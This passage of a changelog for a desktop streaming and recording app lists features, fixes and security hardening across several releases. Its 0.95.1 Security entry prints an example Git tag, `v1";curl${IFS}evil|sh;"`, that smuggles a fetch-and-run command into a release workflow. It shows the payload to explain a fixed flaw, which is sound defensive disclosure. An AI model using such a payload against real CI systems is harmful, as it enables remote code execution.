  **specific scene**, or a **single source** on any connected display (or a floating window). Projectors
  reopen where you left them next launch.
- **A one-key still grab** (CAP-M08) — a lossless PNG of the program (or a single source, pre/post
  filter) into the recordings folder, bindable to a global hotkey.

### Changed
- Scene selection is now a first-class multi-selection throughout the preview; a batch transform commits
  align / distribute / group moves as a single undo step.
- The `preview://` pipe grew per-target full-res projector slots and per-scene projector routing
  alongside the existing program / preview / vertical / workbench / multiview slots; CORS stays pinned to
  the app's own origins.

## [0.96.0] — 2026-07-10 (Accessibility, 18 languages, onboarding & themes)

> Phase 9: the launch polish. The studio now speaks eighteen languages, is fully operable from the
> keyboard and audible to a screen reader, configures itself on first run, and can be themed light.
>
> Two of the bugs below would have shipped in 1.0.0 and are worth naming, because both were invisible
> in review and both are now enforced by a lint or a test rather than by memory. The light theme was
> only half-repaired — dark mode looks perfect whether or not a surface has a light override, so
> white-on-white controls pass code review every time. And upgrading from 0.95.1 would have re-run
> the first-run wizard, whose starter template drops a second display capture onto the scene an
> existing user had already arranged.

### Added
- **The studio speaks 18 languages** (TASK-902) — `ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk
  vi zh-CN`, from a Fluent catalog of **989 keys**. A fresh install follows the operating system's
  language; an explicit choice wins. Arabic drives `<html dir="rtl">`. English is layered beneath
  every locale, so a key a translator has not reached renders in English rather than as a raw id.
  `npm run i18n:lint` fails CI on a missing key, an orphaned key, a duplicate, or a `t("…")` that
  names nothing.

  A parity lint proves the 18 catalogs agree *with each other*; it says nothing about whether the
  app's strings are in them. Three further gates close that gap: a test that every entry of a label
  table resolves, a scan for keys nothing references, and a scan for `t()` called at module scope —
  which would freeze a string to whatever language was loaded at import and never re-translate it.

- **A first-run wizard that configures the machine it is actually running on** (TASK-903, TASK-905).
  It enumerates the GPUs and physical cores, ranks the available hardware encoders, and proposes an
  encoder, canvas, fps and bitrate *with the reason stated in the user's language*. An encoder the
  driver has already refused is skipped rather than recommended. Accepting is one click; so is
  keeping your settings. Skipping counts as finishing — the wizard never returns.

- **A command palette** on `Ctrl`/`Cmd`+`K` (TASK-904), matching on subsequences, so `ssc` finds
  "Start Screen Capture".

- **One Settings modal and an About page** (TASK-906, TASK-907) — language, theme, and the stats dock
  in one place; version, build metadata, licences and the bug reporter in the other.

- **Light and custom themes.** The accent colour is a CSS custom property validated as `#rrggbb` on
  both sides of the IPC boundary, because a string written into a stylesheet is an injection sink.

- **The studio is now navigable without a mouse or a monitor** (TASK-901). Every keyboard stop draws
  a visible focus ring; dialogs trap `Tab` and hand focus back where they took it; `aria-modal` is
  now backed by a real trap rather than a promise. Going live, recording, reconnecting, and losing a
  second of video to dropped frames are announced to screen readers through an `aria-live` region.
  The OS "reduce motion" setting is honoured.

### Fixed
- **Upgrading no longer re-runs the first-run wizard.** `completedOnboarding` is new, and a missing
  key defaults to `false`, so every existing install would have been greeted by a wizard whose
  starter template adds a *second* display capture on top of the scene the user had already arranged.
  Settings files are now migrated on load: one that predates the field but has already accepted an
  EULA has plainly been run before. Keyed on the field being *absent*, not falsy — someone who quits
  halfway through the wizard wrote `false` on purpose and must see it again.

- **The light theme no longer renders white-on-white.** Panels are drawn with translucent *white*
  over near-black, and a CSS variable cannot reach inside a `bg-white/10` utility class, so the light
  theme re-tints those class names with translucent black. Six were missed: the mixer mute/gate
  chips, the REC badge, download progress-bar tracks, status chips, the stats-dock "ended" dot, and
  the EULA blockquote rule. `npm run theme:lint` now fails CI on any white-alpha utility that has no
  light override and no allow-list entry saying why it may stay white.

- **Choosing an accent colour no longer throws a light-theme user into the dark.** The swatch forced
  the theme to Custom so that it "worked" from any mode, but Custom is dark-based — one nudge of the
  colour silently discarded Light. The swatch is disabled outside Custom instead.

- **Screen readers no longer announce a frame-drop burst on every reconnect.** The dropped-frame
  count is cumulative and keeps climbing through an outage, so the first status tick back on air
  compared against the pre-outage baseline and announced the whole outage as a fresh burst — on top
  of the "reconnecting" and "live" announcements the listener had already heard.

- **A failed settings save no longer discards an unrelated setting.** The rollback restored the whole
  settings snapshot captured when the dialog rendered, so a save that failed could undo a *different*
  setting that had succeeded in the meantime. The store is re-read instead.

- **`.frec` recordings now carry their own Explorer icon.** Tauri's `fileAssociations` schema has no
  `icon` field and its NSIS template hardcodes the association's `DefaultIcon` to the app executable,
  so every recording showed the studio's icon while `icons/frec.ico` sat unused in the install
  directory. A `NSIS_HOOK_POSTINSTALL` hook rewrites the ProgId's `DefaultIcon` after the association
  is written, and signals `SHCNE_ASSOCCHANGED` so Explorer repaints without a sign-out. *(Windows;
  the macOS `.icns` and the MSI bundle still show the app icon — separate follow-ons.)* Note the
  association is registered by the **installer**, so a `.frec` shows the generic icon until Freally
  Capture is installed rather than run from a build directory.

## [0.95.1] — 2026-07-09 (Crash reporting, EULA persistence & dialog fixes)

> Six bugs found while drilling the bug-report flow on real hardware — two of which would have shipped
> in 1.0.0 — plus the crash-reporting and updater work those drills demanded. A crash now tells you it
> happened and brings the studio back with the report already open.

### Fixed
- **A crash now tells you it happened, and brings the studio back.** A dying app cannot show its own
  error window, so the panic hook spawns the same executable as a tiny Tauri-free helper
  (`--crash-notice <pid>`), which shows a native "Freally Capture stopped unexpectedly" dialog, waits
  for the crashed process to leave the process table, and relaunches. The reopened studio surfaces
  the scrubbed report automatically. The wait is load-bearing: relaunching while the corpse still
  holds the single-instance lock folds the new launch into the dying app and leaves no studio at all.
- **Accepting the EULA no longer un-accepts itself.** `App.tsx` reads settings *and* the EULA status
  at mount, so the settings snapshot predates acceptance; changing any setting in that same session
  wrote the stale `acceptedEulaVersion: null` back over it and the gate returned on the next launch.
  A profile saved before acceptance did the same. `SettingsStore::set()` now preserves the field and
  `accept_eula()` is its only writer.
- **Dialogs were trapped inside their dock.** `Panel`'s `backdrop-blur` makes it the containing block
  for `position: fixed`, so `PickerShell`'s overlay centred itself inside the dock's box rather than
  the window — 16 of 19 dialogs, including *Check for updates*, rendered partly off-screen with their
  buttons unreachable. `PickerShell` now portals to `document.body`.
- **Emailed crash reports silently opened nothing.** URL length was bounded by character count, but
  percent-encoding inflates a 3-byte character ninefold — a real backtrace produced a ~7800-character
  `mailto:`, past the ~2048 Windows ShellExecute limit, which opens a blank window and reports no
  error. The bound is now on the **whole URL** (scheme, address, subject and body together), enforced
  on encoded length, and truncation never splits an escape. Bounding only the body was not enough:
  a subject is user text, and 80 CJK characters encode to 720 bytes, so a non-English report still
  reached ~2285 characters.
- **Two simultaneous panics showed two crash dialogs.** `panic = "abort"` does not stop the world
  instantly, so two threads could each run the hook. The notice now spawns at most once per process.
- **A crash-notice helper with no readable pid relaunched immediately**, straight into the
  single-instance race it exists to avoid. It now waits a fixed interval instead.
- **Dropdown menus stayed open when you clicked away.** The Sources rail's **+** menu and both
  *Add filter* menus now close on an outside click or Escape. Escape closes the innermost thing only,
  so a menu inside a dialog takes one press to dismiss and a second to close the dialog.

### Added
- **Compose in Gmail** alongside the existing mail-client button — plain https, no API key, nothing
  auto-sent; a signed-out user meets Google's login screen and returns to the pre-filled draft.
- **Crash reports carry the time they happened**, in the user's local clock with its UTC offset and in
  UTC. The offset is weakly identifying and is documented as the one deliberate exception to the
  report's "no personal identifiers" rule; the user reads the exact text before sending.
- **The studio checks for updates once at launch** and surfaces the new version, its number, and this
  file's release notes in a read-only field, with an explicit yes/no. A pending crash report always
  wins the dialog slot; the update waits for the next launch. Offline or rate-limited checks stay
  silent. `latest.json` now carries the version's `CHANGELOG.md` section as its `notes`.
- Windows updates now run the NSIS wizard (`installMode: basicUi`) so the Finish page offers **Run
  Freally Capture** and a desktop-shortcut checkbox, instead of restarting silently. The installer
  also carries the app icon (`nsis.installerIcon`) rather than NSIS's stock one.

### Removed
- The **Testing** section of the bug-report dialog (*Simulate a crash report*, *Force a test crash*)
  and its two IPC commands. A "crash the app" control has no business shipping in a live studio; the
  loop is drilled with the `--test-crash` launch flag, which has no button and no command behind it.

### Security
- **Release workflow: shell injection via the tag name.** `${{ github.ref_name }}` was interpolated
  straight into `run:` blocks, so GitHub spliced the tag into the shell *source* before bash parsed
  it. Ref names forbid spaces but allow `"`, `;`, `$` and backticks, and `${IFS}` supplies the space —
  a tag like `v1";curl${IFS}evil|sh;"` would execute. The tag now reaches the script through `env:`,
  as data. Exploiting it required tag-push access, so this is defence in depth.
- The release job's `actions/checkout` now sets `persist-credentials: false`. It holds
  `contents: write` and only reads `CHANGELOG.md`; leaving the `GITHUB_TOKEN` in `.git/config` would
  have handed any future injection a ready path to push.
- `PRIVACY.md` now states plainly that the update check runs **once per launch** rather than only on
  request, and that it sends nothing about the user — the previous wording said every network request
  was "initiated by your action," which the new startup check made untrue.

## [0.95.0] — 2026-07-08 (Game capture, distribution & per-app audio — Phase 8)

> Signed self-hosted auto-update, per-application audio capture, an NDI runtime seam, a game-capture
> seam that flags the anti-cheat risk honestly, a first-run EULA gate, and video-in-stream for
> reaction/critique — the Phase 8 "toward 1.0.0" surface, all local and off by default.

### Added — Phase 8
- **Signed self-hosted auto-updater** (TASK-803) — the app checks a signed `latest.json` on the
  GitHub releases endpoint and verifies every download against a minisign public key baked into the
  binary before applying it (an unsigned/tampered package is refused). **⭳ Check for updates…** in
  the Controls dock — nothing downloads without a click; the app restarts to finish. The release
  pipeline signs each artifact and composes `latest.json`; macOS Developer-ID + notarization is
  wired and gated on secrets (paid-cert upgrade, no workflow change). See `design/updater-signing.md`.
- **Per-application audio capture** (TASK-805) — capture one app's audio as its own mixer source.
  Windows-first via WASAPI **process loopback** (`ActivateAudioInterfaceAsync` on the process-loopback
  virtual device, Win10 2004+); the COM `unsafe` is isolated in the new `fcap-appaudio` crate so
  `fcap-audio` stays `#![forbid(unsafe_code)]`. It gets a full mixer strip (VU, fader, mute,
  monitoring, filters, track). Linux/macOS show the honest per-OS guidance. Sources ▸ **Application
  Audio**.
- **Game Capture seam + honest anti-cheat/AV flagging** (TASK-801) — "Game Capture" (injecting a
  DX/GL/Vulkan hook) is an opt-in, **flagged milestone**: the app never injects silently and surfaces
  the anti-cheat **ban risk** + AV risk before any hook. The working path today — **Window Capture**
  (borderless/windowed) — is recommended per-OS (Wayland → the portal). Sources ▸ **Game Capture
  (read first)**.
- **NDI runtime seam** (TASK-804) — optional NDI output detects a user-installed NDI runtime (never
  bundled) via the documented env vars + default dirs and link-probes it; the typed output flag is
  gated on that detection. Frame-send binds to the free NDI SDK headers (named follow-on). Surfaced
  read-only in Components ▸ **Optional integrations**.
- **First-run EULA acceptance gate** — the studio doesn't render until the current EULA version is
  accepted (scroll-to-read **I Agree** / **Decline & Quit**); acceptance is persisted and re-prompts
  only when the EULA version changes. `EULA.md` is embedded at build time so the accepted text is
  exactly what ships.
- **Video in the stream (reaction/critique)** — embed a video into the scene and **pause/resume it
  live** while talking over it, then remove it — the Media source's audio pauses and resumes in the
  mix with the picture (⏸/▶ on media sources).
- **In-app component downloads** — the on-demand ffmpeg download now shows an explicit
  `98.35%`-style percentage beside its progress bar + cancel. A new **Browser Source runtime
  (Chromium/CEF)** component downloads the ~100 MB CEF runtime the same honest way: it resolves the
  newest stable build from the official CEF build index, **verifies the download against that
  index's SHA-1 before unpacking** (no bundling, no hardcoded hash), and caches it per-user — with
  the same %/bar/cancel UI. The browser *source* that renders through the runtime is its own
  follow-on milestone; this ships the runtime download.

### Scoped honestly (Phase 8)
- **VST2/3** (TASK-804) — deferred behind a flag: the VST2 SDK is no longer licensed by Steinberg and
  VST3 is GPLv3-or-proprietary, both conflicting with a $0/no-extra-license build. The owned DSP
  filter set (denoise, gate, compressor, limiter, EQ, gain, ducking) is the shipped alternative.
- **Game-capture GPU-hook injection** and **NDI frame-send** are the named follow-on milestones the
  seams above are stable for.

## [0.90.0] — 2026-07-08 (Remote control, scripting & plugins — the extensibility surface)

> Drive the studio from a Stream Deck, react to go-live with a script, embed a chat dock, and extend
> the app with a plugin — the Phase 7 extensibility surface, all **local and off by default**.

### Added — extensibility (Phase 7)
- **WebSocket remote-control API** (TASK-701) — a password-protected WebSocket a Stream Deck /
  Companion-style controller connects to: switch scenes, run the transition, start/stop the stream
  and recording, save replays, set mutes/volumes — the same actions as the UI, nothing more (it
  cannot read files). **Off by default**; binds `127.0.0.1` unless LAN is explicitly enabled;
  disabled means the port is closed. Auth is challenge–response — the password never crosses the
  wire. Settings → Controls → **⌁ Remote…**.
- **Browser docks** (TASK-702) — open a chat popout, alerts page, or Companion web buttons as their
  own window beside the studio (http/https only; the dock has no access to the app, it just
  renders). Controls → **⧉ Docks…**.
- **Sandbox Lua scripting** (TASK-703) — `.lua` scripts that react to studio events (go-live, scene
  change, recording state) and drive the same command surface as the remote API. The sandbox has
  **no file or OS access** (no `io`/`os`/`require`, and the bytecode loaders are closed); a script
  error is contained. `scripts/sample.lua` shows the API. Controls → **⚡ Scripts…**.
- **Plugin SDK** (TASK-704) — documented `Source`/`Filter` contracts + a registry seam, so a plugin
  crate can add a source or filter **without touching core**. `plugins/checkerboard` is the complete
  sample; `design/plugin-sdk.md` is the guide.
- **Web join page for phone guests** (TASK-R3) — the invite QR now opens
  `docs/join.html` on the Pages site: the guest end of a remote-guests session running in a plain
  browser (camera + mic, explicit-click join, self-mute under the two-gate model, host talkback +
  host-view, screen share where the browser supports it, auto-rejoin with backoff) — no install,
  no CDN (PeerJS vendored). The copyable `freally://` link still opens the app directly.

### Fixed
- **Native preview (Windows)** — the render thread's first surface build is now serialized with
  UI-thread DirectComposition commits under the overlay lock (a narrow blank-preview race when a
  resize landed exactly as the surface was born), and the native selection box now reuses the
  compositor's own crop chain-size fold instead of a hand-rolled copy (TASK-NP7).
- **Window capture** — the cursor pump no longer synthesizes undrawn ~60 fps frames while the
  cursor moves somewhere that is *not* over the captured window (another window occluding it, or
  anywhere else on the desktop). Found by the new process-per-test live harness
  (`scripts/live-capture-tests.ps1`, TASK-NP9), which also sidesteps the WinRT/D3D teardown race
  that could crash multi-test live runs.
- **Charter docs** — README / PRIVACY / SECURITY now describe the opt-in remote-guests P2P
  network surface honestly (expiring invites, explicit-click join, P2P DTLS-SRTP media, the
  broker carries only the handshake, optional user-owned TURN, moderation + ban semantics), and
  `THIRD-PARTY-NOTICES.md` gained the missing PeerJS + qrcode-generator entries.

### Security
- **Lua sandbox hardening** — the scripting sandbox now closes the base-library `load`/`loadstring`
  and `string.dump`, not just `dofile`/`loadfile`. Lua 5.4's `load` defaults to accepting **binary
  bytecode**, whose loader is unverified — a crafted bytecode chunk is a native-code VM escape that
  would bypass the no-io/no-os sandbox entirely. Caught by this phase's security review before
  release; a regression test asserts all three are gone.

## [0.85.0] — 2026-07-07 (Streaming depth: multistream / SRT / WHIP + scene/source/encoder depth)

> **The magic moment** — go live to Twitch **and** YouTube at once while recording a separate
> local copy and saving a 30-second replay, with a vertical 9:16 output, nested scenes, and a
> live chat overlay that needs **no API key or sign-in, ever**.

### Added — streaming depth
- **Simultaneous multistream** (TASK-601) — go live to several targets at once, **direct to each
  platform** (no restream server). Targets whose encode settings match **share a single hardware
  encode** (fanned out through ffmpeg's `tee`); different settings encode separately. A failed
  target is split out to its own reconnecting lane so it can never drag a healthy one down; the
  stats dock shows independent per-target health + bitrate.
- **SRT and WHIP** (TASK-602) — stream to a self-hosted SRT ingest or a WebRTC WHIP endpoint
  alongside RTMP/RTMPS, with reconnect + health. The installed ffmpeg's SRT/WHIP support is
  probed honestly at Go Live. WHIP stream keys ride the `Authorization` header, never the URL.
- **Rolling replay buffer** (TASK-603) — while armed, a background encode keeps the last N seconds
  as small on-disk segments (bounded memory + disk); a global hotkey saves them to a playable file
  **without interrupting the stream or the recording**, with length + quality presets.
- **Vertical / multi-canvas** (TASK-604) — a second canvas (e.g. 9:16) composed from any scene at
  its own size, **recordable and streamable independently** of the main canvas; a live preview and
  its own fps stat.

### Added — scene / source / filter / encoder depth
- **Nested scenes, source groups, and per-scene audio** (TASK-605) — a scene composed as a source
  inside another (cycle-safe); groups that move/show/hide together; a per-scene mixer override so a
  scene can sound different from the global mix.
- **Transition packs** (TASK-606) — a **stinger** (a video over the cut), a **custom luma-wipe
  image**, and more built-in wipe patterns (horizontal / diamond / clock).
- **Image Slideshow source + capture-card presets** (TASK-607) — an ordered image set cycling on a
  timer with an optional crossfade, loop/hold-last and shuffle; common Elgato/AVerMedia format
  presets in the video-device picker (only modes the card actually advertises).
- **Color-key / luma-key + render-delay filters** (TASK-608) — key out any color by RGB distance
  (non-green backdrops), key on brightness, and delay a source's video by N ms to line it up with
  audio.
- **Encoder depth** (TASK-609) — **Rec.709** color pinned on every wire encode (no more washed/
  shifted HD colors), an optional **output downscale** (record/stream at a different resolution
  than the canvas — per stream target), and high-FPS (120/144/240) + 4K paths. HDR is documented
  honestly as out of scope (the canvas is 8-bit SDR).
- **Recording chapter markers** (TASK-610) — a marker hotkey drops a chapter into the active
  recording (mkv chapters, or a readable sidecar for other containers). Platform-side stream
  markers need account APIs — out by charter, said honestly in-product.
- **Live chat overlay** (TASK-613) — a transparent, time-stamped on-canvas record of the incoming
  livestream chat (username + message + a 12-hour timestamp). **The end user never needs an API
  key, a developer account, or a sign-in for YouTube or Twitch:** YouTube reads through an owned
  InnerTube client exactly like the web player, Twitch reads anonymous IRC, Kick polls its public
  endpoint. A chat flood only ages old lines out — it can never stall the stream, the recording,
  or the overlay.
- **Floating reactions overlay** (TASK-614) — viewer reaction emoji rise and fade **baked into the
  program** (recorded and streamed), from the in-app reaction bar or spotted in the same no-key
  chat ingest; a bounded particle pool means a reaction flood only caps what's on screen.

### Deferred (honest)
- **Virtual-camera depth** (TASK-611) — a real virtual camera is a signed OS driver component (its
  own milestone). The feed model (program / vertical / single source) and the per-OS transport seam
  ship now; the button stays disabled with the whole story in its tooltip.
- **Browser source** (TASK-612) — a design spike (`design/browser-source-spike.md`) recommends a
  CEF-class embed shipped as an on-demand component (like ffmpeg); the decision is Mike's.

## [0.70.0] — 2026-07-06 (Streaming + Studio MVP — first public)

> The studio you can go live with: single-target RTMP/RTMPS streaming, Studio Mode + GPU
> transitions, global hotkeys, profiles + scene collections, a real stats dock — and the full
> P2P **Remote Guests** collaboration merged in from Phase R.

### Added
- **Single-target streaming** (RTMP/RTMPS to Twitch/YouTube/Kick/Facebook/Trovo/Custom) with a
  secret, redacted stream key, reconnect backoff, and auto-record-on-Go-Live; the local recording
  is never touched by stream state.
- **Studio Mode + GPU transitions** — a live preview pane and a commit transition (cut/fade/slide/
  swipe/luma) the audience sees.
- **Global hotkeys** (record / Go Live / transition) and a **real stats dock** (fps / dropped /
  render-ms + this process's CPU% / memory).
- **Profiles + scene collections** — switchable settings + scene snapshots, remembered across
  restarts.
- **Remote Guests (Phase R)** — opt-in P2P/WebRTC remote collaboration: expiring invite links,
  guest mic into the mixer, two-gate mute, Highlight Speaker, the screen-plus-corners layout, and
  a user's own opt-in TURN relay (no author-run infrastructure).

## [0.56.0] — 2026-07-06 (Native GPU preview + Window Capture upgrades)

> The preview now *feels* like OBS on **Windows, macOS, and Linux**: the compositor's GPU output is
> painted straight onto the screen with no read-back/encode round-trip — and Window Capture picks
> with live thumbnails, survives a restart, and recovers on its own.

### Added — native GPU preview ("OBS feel") on Windows, macOS, and Linux
- **A zero-copy native GPU preview surface** that replaces the read-back → JPEG → canvas preview with
  the compositor's own GPU output painted directly on screen — no encode round-trip, no lag. Per OS:
  **Windows** a **DirectComposition** surface (wgpu `SurfaceTargetUnsafe::CompositionVisual` on DX12)
  composited *above* WebView2, **verified real-time on hardware**; **macOS** a **CAMetalLayer** over
  the WKWebView (Metal); **Linux** an X11 child window driving a **Vulkan/GL** surface (Wayland keeps
  the JPEG preview for now). All three are **CI-proven to render** — the screenshot smoke asserts the
  actual pixels on every push. The interactive **selection box + transform handles are drawn into the
  GPU frame itself** (preview-only — never recorded or streamed). Under the hood the GPU stack was
  **upgraded wgpu 0.20 → 27**. The JPEG preview stays as the universal fallback and returns
  automatically whenever the native surface isn't viable (a non-DX12 Windows GPU, Wayland, a lost
  surface).

### Added — a live-thumbnail window picker that lists every window
- **The Window Capture picker now shows a live thumbnail of every open window** — a tile grid of
  real captured frames, refreshed while the picker is open (staggered so opening it doesn't burst
  the backend), with a manual refresh button. Thumbnails travel as **in-memory JPEG `data:` URIs
  over IPC — nothing is ever written to disk**, so they vanish the moment the picker closes.
- **Minimized windows are listed too** (they were previously filtered out): Windows falls back to
  the window's restored size when it's iconic, macOS enumerates off-screen windows, and Linux/X11
  already listed them. A dedicated **window-enumeration CI job** opens two windows, minimizes one,
  and asserts both appear.
- **The yellow Windows capture border is gone** — Windows.Graphics.Capture sessions now request no
  border (best-effort; older Windows builds that don't support it keep the old behavior).

### Added — Window Capture that re-binds on restart + auto-recovery
- **A Window Capture re-attaches to the *same* window when you relaunch the app** — the way OBS Studio
  does. An OS window handle (Windows `HWND`, macOS `CGWindowID`, X11 XID) is only valid for one session,
  so a saved Window source now also stores the window's **durable identity** — its executable / owning
  app, its window class, and its title — and on start **re-resolves the live window by matching that
  identity**, anchored on the app so it never binds to an unrelated program (class + title break ties
  between several windows of the same app). Handle-only ids from older saved scenes still load. *Windows
  is verified on hardware; macOS (ScreenCaptureKit) and Linux/X11 share the same matcher and are
  validated in CI; Wayland is unaffected — its system portal re-picks the source and is already durable.*
- **Errored captures recover on their own.** A Display / Window / Video Capture source that failed
  because its window, monitor, or camera wasn't there yet is **retried automatically** (per-source
  exponential backoff, 3 s doubling to 60 s), so it goes live the moment the window reopens or the
  device reconnects — no manual Retry needed (the Retry button stays for an on-demand nudge).
  Screen-picker portal and media sources are left alone.
- **A captured window that closes mid-session is detected reliably.** Windows' capture-closed event
  never fires for some elevated / tray-hiding apps, which would have left the source frozen "live"
  on its last frame; the capture now also watches the window handle itself and errors out the moment
  the window is really gone — which is exactly what arms the auto-recovery above.
- **The mouse cursor now tracks in Window Capture — focused or not.** Windows only composites the
  cursor into captures of the *focused* window (an unfocused one gets no cursor, and no frames at all
  while its content is static), so a captured app you weren't clicking on looked frozen. Freally
  Capture now **draws the cursor itself**, the way OBS does — real cursor shapes (alpha, classic
  mask, and inverting cursors), tracked live and composited into the frame, with frames synthesized
  when only the cursor moved. Measured on hardware: an unfocused window went from ~0 updates to
  **55 fps under fast movement / 32 fps at hover speed**. **Display capture** got the same treatment:
  the cursor keeps moving in a recording even when the rest of the desktop is static.

## [0.55.0] — 2026-07-03 (Audio mixer + recording)

> The 0.55.0 rung is **Phase 3 (audio mixer + filters)** plus **Phase 4 (recording)** — the studio can
> now mix and **record** its program feed to disk, multi-track, with the best available hardware encoder
> or the owned lossless codec.

### Added — recording (Phase 4)
- **The owned `freally-video` (`.frec`) lossless codec** (`fcap-encode`): the default local-recording
  format, authored here and **owned outright** — temporal frame deltas + PNG-style left-pixel
  prediction + an owned byte-aligned **FLZ** (LZ77) stage, every technique decades-expired or
  public-domain, **zero dependencies, nothing fetched**, `#![forbid(unsafe_code)]`. The container carries
  up to **6 interleaved stereo PCM tracks** with absolute sample positions (A/V sync + gapless pause by
  construction), intra frames on a ~2 s cadence, a seek index, and a **truncation-tolerant reader** (a
  crashed recording plays back to its last complete chunk; corrupt input errors, never panics, and is
  allocation-capped against hostile files). Real-time verified: a synthetic 1080p60 encode holds its
  budget.
- **Encoder detection + the encoder catalog**: a `wgpu` GPU probe (vendor ids + name heuristics,
  software rasterizers skipped) drives per-OS offer rules — **NVENC / Quick Sync / AMF** on Windows,
  **NVENC / VAAPI** (render-node gated) on Linux, **VideoToolbox** on macOS — always alongside the
  universal **x264 / x265 / AV1** CPU fallbacks. Hardware encoders are offered as honest candidates and
  **confirmed by a real 3-frame smoke encode** on first use (support varies by GPU + driver); every wire
  encoder labels its ffmpeg dependency.
- **Multi-track muxing, containers, and file splitting**: record to **mp4 / mkv / mov / webm** (wire
  codecs) or the owned **`.frec`** (lossless), with **up to 6 audio tracks**, and **automatic file
  splitting** into standalone playable segments. The recording engine runs a strict-CFR clock (frame
  count locked to recorded time), so A/V stays in sync through stalls and **pause/resume is gapless
  within one playable file**. The main recording is architected to continue regardless of stream state
  (streaming lands in 0.70.0), and a **separate-track local copy** is persisted for it.
- **The clearly-labeled, on-demand ffmpeg bridge** (`fcap-encode::ffmpeg`): the patent-encumbered wire
  codecs (H.264/AAC/HEVC/AV1) run through ffmpeg, which is **never bundled**. On first use it is fetched
  from a **per-OS pinned build** (URL + **SHA-256 baked into source**, cross-checked against the
  publisher's own checksum), **hash-verified before anything runs** (a mismatch aborts the install),
  extracted (a single member — archive paths are never used for writing), and driven as a **separate
  process** (which also keeps its LGPL/GPL license isolated from the owned app). A clearly-labeled
  **Components** panel shows what it is, why it exists, the pinned source, and live %/of-total/MB/s
  progress; the owned `.frec` path needs none of it.
- **HEVC / AV1 recording + post-record remux**: HEVC and AV1 record through the labeled ffmpeg path
  (hardware where the GPU supports it); a **Recordings** list (Controls → Files…) shows finished files
  newest-first and offers **Remux to MP4** (mkv → mp4, `-c copy`, no re-encode, faststart, `hvc1` tag on
  HEVC). The remux command validates the path lives inside the recordings folder — the webview can never
  point it at arbitrary files.
- **Encoder settings + presets** (Settings → Output): rate control **CBR / VBR / CQP** + bitrate +
  keyframe interval, per-encoder **Quality / Balanced / Performance** presets (mapped onto each family's
  own knob), per-track audio bitrate, and one-click **Lossless / High-quality / Balanced** record
  presets. Recording controls in the dock: **Start / Stop / Pause / Resume**, a pulsing **REC**
  indicator with duration (pauses excluded) + track count, and the last session's files or its honest
  error.
- **The Media source** (`fcap-sources::media`) — folded in from Phase 2: a video/image file composed on
  the canvas **with its audio in the mixer**. Still images decode once (like the Image source); **`.frec`
  plays through the owned codec** with nothing fetched; the wire formats decode through the labeled
  ffmpeg component (`-hwaccel auto` hardware decode, software fallback, loop/restart), and a stop
  watchdog means a wedged decoder can never wedge the studio. Media audio flows through a new
  **media-audio hub** so a media clip gets a full mixer strip (fader, filters, tracks, sync offset) with
  no special cases.

### Added — audio mixer (Phase 3)
- **The owned audio engine** (`fcap-audio`): a `cpal` capture graph running everything internally as
  **stereo f32 at 48 kHz** in 10 ms blocks. Per-source **microphone / line-in** (Audio Input) and
  **desktop / system audio** (Audio Output) capture, each format-converted and resampled into the
  engine clock through an **owned streaming linear resampler**. Desktop audio is told honestly per OS:
  **Windows** captures any output device via **WASAPI loopback**; **Linux** uses a PipeWire/PulseAudio
  **monitor** device; **macOS** needs a virtual loopback device (e.g. BlackHole) until a
  ScreenCaptureKit audio path lands — the pickers say so and filter for known virtual devices.
- **The mixing graph**: per-source **sync-offset delay → filter chain → push-to-talk / push-to-mute /
  mute / fader**, routed into **up to 6 track buses** (per-source assignment), the **program (master)**
  mix, and a **monitor** mix. Click-free ~8 ms gain smoothing on every mute/PTT/fader move. The whole
  core is pure and **device-free — every routing rule is unit-tested without hardware**.
- **The owned classic-DSP filter set — no ML anywhere, per charter**: **Denoise** (STFT spectral
  suppression with an owned radix-2 FFT — 512-sample √Hann frames, 50% overlap, per-bin noise-floor
  tracking + spectral subtraction; steady noise drops while speech passes), **Noise Gate** (hysteresis
  + hold), **Compressor** (peak-sensing, make-up gain), **Limiter** (instant-attack with a hard
  ceiling), **3-Band EQ** (RBJ shelf/peak biquads), **Gain**, and sidechain **Ducking** (dip one source
  under another). Every processor is clamped defensively so a hand-edited scene can't build a runaway.
- **Monitoring, ducking, PTT/PTM, and LUFS**: a **monitor output** on any device (bounded, underrun-safe);
  sidechain ducking driven by the trigger source's live envelope; **push-to-talk / push-to-mute** via
  global hotkeys (registered from the model, honest about Wayland's lack of global hotkeys); a
  **BS.1770 K-weighted LUFS** meter (momentary + short-term) on the program mix; per-source peak/RMS
  metering.
- **The Audio Mixer panel**: one **channel strip** per audio source in the active scene — name +
  status, a **VU meter** (green→yellow→red, peak tick), a **fader** (−60…+6 dB), **mute**, a **monitor**
  cycle, an **audio-filters** dialog (all 7 filters, with a trigger picker for ducking), **track dots
  1–6**, and an advanced popover (sync offset + PTT/PTM hotkeys). A **LUFS** readout and a
  **monitor-device** picker (persisted in settings). Audio sources appear in the Sources rail with the
  same live status dots as video, and in the **Add Source** menu with per-OS-honest device pickers.
- The scene/source model (`fcap-scene`) gains **Audio Input / Audio Output** source kinds and a
  per-source **`AudioSettings`** strip (fader, mute, monitor mode, track bitmask, sync offset, PTT/PTM
  hotkeys, the ordered audio-filter chain) — serde round-trip tested, camelCase wire-checked,
  range-clamped, and self-repairing on load (audio state exists exactly on audio-capable sources).

### Security / privacy
- The posture is unchanged and re-verified: captured audio + composed frames flow **only** to the mixer,
  the monitor device the user picks, the **recording file**, and the virtual camera — **nothing leaves
  the machine**, no accounts, no telemetry. The monitor-device name persisted in settings is
  length/shape-validated; hotkey accelerators are parsed/validated before they enter the model.
- **The one network action added this rung is the explicit, user-clicked ffmpeg download** — over TLS
  from a **hardcoded, per-OS pinned URL**, **SHA-256-verified before the binary is ever executed**, and
  driven as a separate process. It never starts on its own; a checksum mismatch aborts the install. The
  owned `.frec` recording path makes no network calls at all.
- The recording engine's ffmpeg audio tracks ride **loopback-only (`127.0.0.1`) sockets** that accept
  exactly one connection then close; recording settings (encoder id, container, bitrate, folder,
  filename) are **range/shape-validated** before use, and **remux/recordings actions are confined to the
  recordings folder** (canonicalized parent check) so the webview cannot reach arbitrary files. The
  `.frec`/media parsers treat file bytes as **untrusted** — allocation-capped, erroring rather than
  panicking on corrupt input.
- New third-party dependencies, all recorded in `THIRD-PARTY-NOTICES.md`: **`tauri-plugin-global-shortcut`**
  (push-to-talk/mute), and the ffmpeg-bridge fetch/verify/unpack set (**`ureq`** + rustls, **`sha2`**,
  **`zip`**, **`tar`** + **`lzma-rs`**) plus **`chrono`** (local-time filenames). The audio DSP and the
  **`freally-video`** codec are **entirely owned**; ffmpeg is **driven, never bundled**.
